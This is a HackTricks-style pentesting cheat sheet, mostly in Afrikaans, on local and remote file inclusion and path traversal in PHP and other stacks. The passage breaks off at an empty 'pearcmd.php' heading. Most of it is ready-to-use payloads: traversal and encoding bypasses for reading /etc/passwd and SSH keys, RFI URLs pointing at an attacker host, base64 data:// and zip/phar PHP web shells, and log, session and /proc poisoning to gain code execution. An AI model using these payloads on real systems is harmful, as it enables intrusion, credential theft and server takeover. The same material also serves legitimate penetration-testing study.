# Lêer Insluiting/Pad Traversie

{{#include ../../banners/hacktricks-training.md}}

## Lêer Insluiting

**Afgeleë Lêer Insluiting (RFI):** Die lêer word van 'n afgeleë bediener gelaai (Beste: Jy kan die kode skryf en die bediener sal dit uitvoer). In php is dit **deaktiviseer** per standaard (**allow_url_include**).\
**Plaaslike Lêer Insluiting (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid gebeur wanneer die gebruiker op een of ander manier die lêer kan beheer wat deur die bediener gelaai gaan word.

Kwetsbare **PHP funksies**: require, require_once, include, include_once

'n Interessante hulpmiddel om hierdie kwesbaarheid te benut: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessant - LFI2RCE lêers
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie \*nix LFI-lists te meng en meer paaie by te voeg, het ek hierdie een geskep:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` te verander na `\`\
Probeer ook om `../../../../../` by te voeg.

'n Lys wat verskeie tegnieke gebruik om die lêer /etc/password te vind (om te kyk of die kwesbaarheid bestaan) kan [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) gevind word.

### **Windows**

Samevoeging van verskillende woordlyste:

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` te verander na `\`\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg.

'n Lys wat verskeie tegnieke gebruik om die lêer /boot.ini te vind (om te kyk of die kwesbaarheid bestaan) kan [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) gevind word.

### **OS X**

Kontroleer die LFI lys van linux.

## Basiese LFI en omseilings

Al die voorbeelde is vir Local File Inclusion, maar kan ook op Remote File Inclusion toegepas word (bladsy=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traverseringsekwensies nie-rekursief verwyder
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Om die byvoeging van meer karakters aan die einde van die verskafde string te omseil (omseiling van: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Kodering**

Jy kan nie-standaard kodering soos dubbele URL-kodering (en ander) gebruik:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Van bestaande gids

Miskien kyk die agterkant na die gids pad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verkenning van Lêerstelsels op 'n Bediening

Die lêerstelsel van 'n bediener kan herhalend verken word om directories te identifiseer, nie net lêers nie, deur sekere tegnieke toe te pas. Hierdie proses behels die bepaling van die directory-diepte en die ondersoek na die bestaan van spesifieke vouers. Hieronder is 'n gedetailleerde metode om dit te bereik:

1. **Bepaal Directory Diepte:** Bepaal die diepte van jou huidige directory deur suksesvol die `/etc/passwd` lêer op te haal (van toepassing as die bediener op Linux gebaseer is). 'n Voorbeeld-URL kan as volg gestruktureer wees, wat 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Dienste vir Gidsen:** Voeg die naam van die vermoedlike gids (bv. `private`) by die URL, en navigeer dan terug na `/etc/passwd`. Die bykomende gidsvlak vereis dat die diepte met een verhoog word:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret die Uitslae:** Die bediener se antwoord dui aan of die gids bestaan:
- **Fout / Geen Uitset:** Die gids `private` bestaan waarskynlik nie op die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die teenwoordigheid van die `private` gids word bevestig.
4. **Recursiewe Verkenning:** Ontdekte gidse kan verder ondersoek word vir subgidse of lêers met dieselfde tegniek of tradisionele Local File Inclusion (LFI) metodes.

Vir die verkenning van gidse op verskillende plekke in die lêerstelsel, pas die payload dienooreenkomstig aan. Byvoorbeeld, om te kyk of `/var/www/` 'n `private` gids bevat (aannemende dat die huidige gids op 'n diepte van 3 is), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Pad Afkorting Tegniek**

Pad afkorting is 'n metode wat gebruik word om lêerpaaie in webtoepassings te manipuleer. Dit word dikwels gebruik om beperkte lêers te bekom deur sekere sekuriteitsmaatreëls te omseil wat addisionele karakters aan die einde van lêerpaaie voeg. Die doel is om 'n lêerpad te skep wat, sodra dit deur die sekuriteitsmaatreël verander word, steeds na die gewenste lêer wys.

In PHP kan verskeie voorstellings van 'n lêerpad as gelykwaardig beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, en `/etc/passwd/` word almal as dieselfde pad hanteer.
- Wanneer die laaste 6 karakters `passwd` is, verander die toevoeging van 'n `/` (wat dit `passwd/` maak) nie die geteikende lêer nie.
- Op soortgelyke wyse, as `.php` aan 'n lêerpad gevoeg word (soos `shellcode.php`), sal die toevoeging van `/.` aan die einde nie die lêer wat toegang verkry nie, verander.

Die verskafde voorbeelde demonstreer hoe om pad afkorting te gebruik om toegang te verkry tot `/etc/passwd`, 'n algemene teiken weens sy sensitiewe inhoud (gebruikersrekeninginligting):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's mag die aantal traversals wat nodig is rondom 2027 wees, maar hierdie getal kan wissel op grond van die bediener se konfigurasie.

- **Gebruik van Punt Segmente en Bykomende Karakters**: Traversal volgordes (`../`) gekombineer met ekstra punt segmente en karakters kan gebruik word om die lêerstelsel te navigeer, wat effektief bygevoegde stringe deur die bediener ignoreer.
- **Bepaling van die Benodigde Aantal Traversals**: Deur middel van proef en fout kan 'n mens die presiese aantal `../` volgordes vind wat nodig is om na die wortelgids te navigeer en dan na `/etc/passwd`, terwyl verseker word dat enige bygevoegde stringe (soos `.php`) geneutraliseer word, maar die gewenste pad (`/etc/passwd`) intakt bly.
- **Begin met 'n Vals Gids**: Dit is 'n algemene praktyk om die pad met 'n nie-bestaande gids (soos `a/`) te begin. Hierdie tegniek word gebruik as 'n voorsorgmaatreël of om aan die vereistes van die bediener se pad parsingslogika te voldoen.

Wanneer pad truncasie tegnieke toegepas word, is dit van kardinale belang om die bediener se pad parsingsgedrag en lêerstelselstruktuur te verstaan. Elke scenario mag 'n ander benadering vereis, en toetsing is dikwels nodig om die mees effektiewe metode te vind.

**Hierdie kwesbaarheid is in PHP 5.3 reggestel.**

### **Filter omseil truuks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard gedeaktiveer omdat **`allow_url_include`** is **Af.** Dit moet **Aan** wees vir dit om te werk, en in daardie geval kan jy 'n PHP-lêer van jou bediener insluit en RCE verkry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
As dit om een of ander rede **`allow_url_include`** is **Aan**, maar PHP **filter** toegang tot eksterne webbladsye, [volgens hierdie pos](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data protokol met base64 gebruik om 'n b64 PHP kode te dekodeer en RCE te verkry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!NOTE]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die aanvaller 'n string nodig gehad het wat in `.txt` eindig, so die string eindig daarmee en na die b64-dekodeer sal daardie deel net rommel teruggee en die werklike PHP-kode sal ingesluit word (en dus, uitgevoer word).

Nog 'n voorbeeld **wat nie die `php://` protokol gebruik nie** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root element

In python in a code like this one:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute pad** na **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en die aansluiting gaan voort vanaf die absolute padkomponent.

## Java Lys Gidsen

Dit lyk of jy 'n Pad Traversal in Java het en jy **vra vir 'n gids** in plaas van 'n lêer, 'n **lys van die gids word teruggestuur**. Dit sal nie in ander tale gebeur nie (sover ek weet).

## Top 25 parameters

Hier is 'n lys van die top 25 parameters wat kwesbaar kan wees vir plaaslike lêerinvoeging (LFI) kwesbaarhede (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI met PHP wrappers & protokolle

### php://filter

PHP-filters laat basiese **wysigingsoperasies op die data** toe voordat dit gelees of geskryf word. Daar is 5 kategorieë filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags van die data (alles tussen "<" en ">" karakters)
- Let daarop dat hierdie filter uit die moderne weergawes van PHP verdwyn het
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformeer na 'n ander kodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle ondersteunde kodering** te kry, voer in die konsole in: `iconv -l`

> [!WARNING]
> Deur die `convert.iconv.*` omskakelingsfilter te misbruik, kan jy **arbitraire teks genereer**, wat nuttig kan wees om arbitraire teks te skryf of 'n funksie soos insluitingsproses arbitraire teks te maak. Vir meer inligting, kyk na [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimeer die inhoud (nuttig as jy baie inligting uitbring)
- `zlib.inflate`: Decomprimeer die data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Verouderd
- `mdecrypt.*` : Verouderd
- Ander Filters
- Deur in php `var_dump(stream_get_filters());` te loop, kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: keer HTTP chunked kodering om
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die deel "php://filter" is nie-sensitief vir hoofletters nie

### Gebruik php filters as orakel om arbitrêre lêers te lees

[**In hierdie pos**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) word 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder om die uitvoer van die bediener terug te ontvang. Hierdie tegniek is gebaseer op 'n **booleaanse eksfiltrasie van die lêer (karakter vir karakter) met behulp van php filters** as orakel. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak sodat php 'n uitsondering gooi.

In die oorspronklike pos kan jy 'n gedetailleerde verduideliking van die tegniek vind, maar hier is 'n vinnige opsomming:

- Gebruik die kodek **`UCS-4LE`** om die voorste karakter van die teks aan die begin te laat en maak die grootte van die string eksponensieel groter.
- Dit sal gebruik word om 'n **teks so groot te genereer wanneer die aanvanklike letter korrek geraai word** dat php 'n **fout** sal veroorsaak.
- Die **dechunk** filter sal **alles verwyder as die eerste karakter nie 'n hexadesimale is nie**, sodat ons kan weet of die eerste karakter hex is.
- Dit, gekombineer met die vorige een (en ander filters afhangende van die geraaide letter), sal ons in staat stel om 'n letter aan die begin van die teks te raai deur te sien wanneer ons genoeg transformasies doen om dit nie 'n hexadesimale karakter te maak nie. Want as dit hex is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal php fout veroorsaak.
- Die kodek **convert.iconv.UNICODE.CP930** transformeer elke letter in die volgende een (so na hierdie kodek: a -> b). Dit stel ons in staat om te ontdek of die eerste letter 'n `a` is byvoorbeeld, want as ons 6 van hierdie kodek toepas a->b->c->d->e->f->g is die letter nie meer 'n hexadesimale karakter nie, daarom het dechunk dit nie verwyder nie en die php fout word veroorsaak omdat dit met die aanvanklike bom vermenigvuldig.
- Deur ander transformasies soos **rot13** aan die begin te gebruik, is dit moontlik om ander karakters soos n, o, p, q, r te lek (en ander kodeks kan gebruik word om ander letters na die hex reeks te beweeg).
- Wanneer die aanvanklike karakter 'n nommer is, is dit nodig om dit in base64 te kodeer en die eerste 2 letters te lek om die nommer te lek.
- Die finale probleem is om te sien **hoe om meer as die aanvanklike letter te lek**. Deur orde geheue filters soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** te gebruik, is dit moontlik om die orde van die karakters te verander en ander letters van die teks in die eerste posisie te kry.
- En ten einde **verdere data** te verkry, is die idee om **2 bytes van rommeldata aan die begin te genereer** met **convert.iconv.UTF16.UTF16**, toepas **UCS-4LE** om dit te **pivot met die volgende 2 bytes**, en **verwyder die data tot die rommeldata** (dit sal die eerste 2 bytes van die aanvanklike teks verwyder). Gaan voort om dit te doen totdat jy die gewenste bit bereik om te lek.

In die pos is 'n hulpmiddel om dit outomaties uit te voer ook gelekt: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper laat toegang toe tot lêer beskrywings wat die proses oop het. Potensieel nuttig om die inhoud van oop lêers te eksfiltreer:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
U kan ook **php://stdin, php://stdout en php://stderr** gebruik om toegang te verkry tot die **lêer beskrywings 0, 1 en 2** onderskeidelik (nie seker hoe dit nuttig kan wees in 'n aanval nie)

### zip:// en rar://

Laai 'n Zip of Rar-lêer op met 'n PHPShell binne en toegang dit.\
Om die rar-protokol te kan misbruik, **moet dit spesifiek geaktiveer word**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Let wel dat hierdie protokol beperk word deur php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan kode uitvoer met hierdie:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Gee jou payload in die POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` vir lêerlaai benut. Die PHP-kodesnit hieronder demonstreer die skepping van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar`-lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Dit was moontlik om **enige arbitrêre lêer wat van PHP gelees word wat php-filters ondersteun** te misbruik om 'n RCE te verkry. Die gedetailleerde beskrywing kan [**gevind word in hierdie pos**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie vinnige opsomming: 'n **3 byte oorgang** in die PHP heap is misbruik om die **ketting van vrye stukke** van 'n spesifieke grootte te **verander** sodat dit moontlik was om **enigiets in enige adres te skryf**, so 'n haak is bygevoeg om **`system`** aan te roep.\
Dit was moontlik om stukke van spesifieke groottes toe te ken deur meer php-filters te misbruik.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit nuttig kan wees in 'n lêerinvoegaanval nie)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s) URL's
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s) URL's
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressiestrome
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind padname wat aan patroon voldoen (Dit gee niks drukbaar terug nie, so nie regtig nuttig hier nie)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Klankstrome (Nie nuttig om arbitrêre lêers te lees nie)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risiko's in PHP is merkbaar hoog wanneer dit kom by die 'assert' funksie, wat kode binne strings kan uitvoer. Dit is veral problematies as invoer wat katalogus traversering karakters soos ".." bevat, nagegaan word maar nie behoorlik gesuiwer word nie.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Terwyl dit daarop gemik is om traversie te stop, skep dit onbedoeld 'n vektor vir kode-inspuiting. Om dit te benut om lêerinhoud te lees, kan 'n aanvaller gebruik maak van:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, om arbitrêre stelselskommando's uit te voer, kan 'n mens gebruik maak van:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om **URL-encode hierdie payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy **beheer** oor die **lêerpad** van 'n **PHP-funksie** het wat 'n **lêer** sal **toegang** maar jy sal nie die inhoud van die lêer sien nie (soos 'n eenvoudige oproep na **`file()`**) maar die inhoud word nie gewys nie.

In [**hierdie ongelooflike pos**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word verduidelik hoe 'n blinde pad traversering misbruik kan word via PHP-filter om **die inhoud van 'n lêer via 'n fout-orakel te exfiltreer**.

In samevatting, die tegniek gebruik die **"UCS-4LE" kodering** om die inhoud van 'n lêer so **groot** te maak dat die **PHP-funksie wat** die lêer oopmaak 'n **fout** sal veroorsaak.

Dan, om die eerste karakter te lek, word die filter **`dechunk`** gebruik saam met ander soos **base64** of **rot13** en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om **ander karakters aan die begin te plaas en hulle te lek**.

**Funksies wat kwesbaar mag wees**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (slegs teiken lees net hiermee)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede kyk na die genoemde pos!

## LFI2RCE

### Remote File Inclusion

Soos voorheen verduidelik, [**volg hierdie skakel**](#remote-file-inclusion).

### Via Apache/Nginx log lêer

As die Apache of Nginx bediener **kwesbaar is vir LFI** binne die insluitingsfunksie kan jy probeer om toegang te verkry tot **`/var/log/apache2/access.log` of `/var/log/nginx/access.log`**, stel binne die **gebruikersagent** of binne 'n **GET parameter** 'n php shell soos **`<?php system($_GET['c']); ?>`** en sluit daardie lêer in.

> [!WARNING]
> Let daarop dat **as jy dubbele aanhalings gebruik** vir die shell in plaas van **enkele aanhalings**, die dubbele aanhalings sal verander word na die string "_**quote;**_", **PHP sal 'n fout gooi** daar en **niks anders sal uitgevoer word** nie.
>
> Maak ook seker dat jy **die payload korrek skryf** of PHP sal elke keer 'n fout gooi wanneer dit probeer om die log lêer te laai en jy sal nie 'n tweede geleentheid hê nie.

Dit kan ook in ander logs gedoen word, maar **wees versigtig,** die kode binne die logs kan URL-gecodeer wees en dit kan die Shell vernietig. Die kopstuk **authorisation "basic"** bevat "user:password" in Base64 en dit word binne die logs gedecodeer. Die PHPShell kan binne hierdie kopstuk ingevoeg word.\
Ander moontlike log paaie:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing woordlys: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via E-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer om in te sluit in die e-pos van die gebruiker met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Laai 'n groot aantal shells op (byvoorbeeld: 100)
2. Sluit [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) in, met $PID = PID van die proses (kan brute-forced word) en $FD die lêerdeskriptor (kan ook brute-forced word)

### Via /proc/self/environ

Soos 'n loglêer, stuur die payload in die User-Agent, dit sal binne die /proc/self/environ lêer weerspieël word
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Deur op te laai

As jy 'n lêer kan oplaai, voeg net die shell payload daarin in (bv: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou, is dit die beste om in die metadata van die prente/doc/pdf in te spuit.

### Deur Zip lêer op te laai

Laai 'n ZIP-lêer op wat 'n PHP-shell gecomprimeer bevat en toegang:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Deur PHP sessies

Kontroleer of die webwerf PHP-sessie (PHPSESSID) gebruik.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessies in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers gestoor.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die koekie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP-sessie lêer in te sluit
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

As ssh aktief is, kyk watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer om toegang te verkry tot **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Die logs vir die FTP-bediener vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan, en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Spuit 'n PHP payload in die gebruikersnaamveld tydens die aanmeldproses.
2. Na inspuiting, gebruik die LFI om die bedienerlogs van _**/var/log/vsftpd.log**_ te verkry.

### Via php base64 filter (using base64)

Soos in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel gewys, ignoreer die PHP base64 filter eenvoudig Non-base64. Jy kan dit gebruik om die lêer uitbreiding kontrole te omseil: as jy base64 verskaf wat eindig op ".php", sal dit eenvoudig die "." ignoreer en "php" aan die base64 voeg. Hier is 'n voorbeeld payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (geen lêer nodig)

Hierdie [**skrywe**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters kan gebruik om arbitrêre inhoud** as uitvoer te genereer. Dit beteken basies dat jy **arbitrêre php kode** vir die insluiting kan **genereer sonder om** dit in 'n lêer te skryf.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentasiefout

**Laai** 'n lêer op wat as **tydelik** in `/tmp` gestoor sal word, dan in die **dieselfde versoek,** veroorsaak 'n **segmentasiefout**, en dan sal die **tydelike lêer nie verwyder word** nie en jy kan daarna soek.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx tydelike lêer stoor

As jy 'n **Plaaslike Lêer Insluiting** gevind het en **Nginx** loop voor PHP, kan jy dalk RCE verkry met die volgende tegniek:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

As jy 'n **Plaaslike Lêer Insluiting** gevind het selfs al **het jy nie 'n sessie nie** en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data verskaf, sal PHP **die sessie vir jou aktiveer**. Jy kan dit misbruik om RCE te verkry:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via tydelike lêer opgelaai in Windows

As jy 'n **Plaaslike Lêer Insluiting** gevind het en die bediener loop in **Windows**, kan jy RCE verkry:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

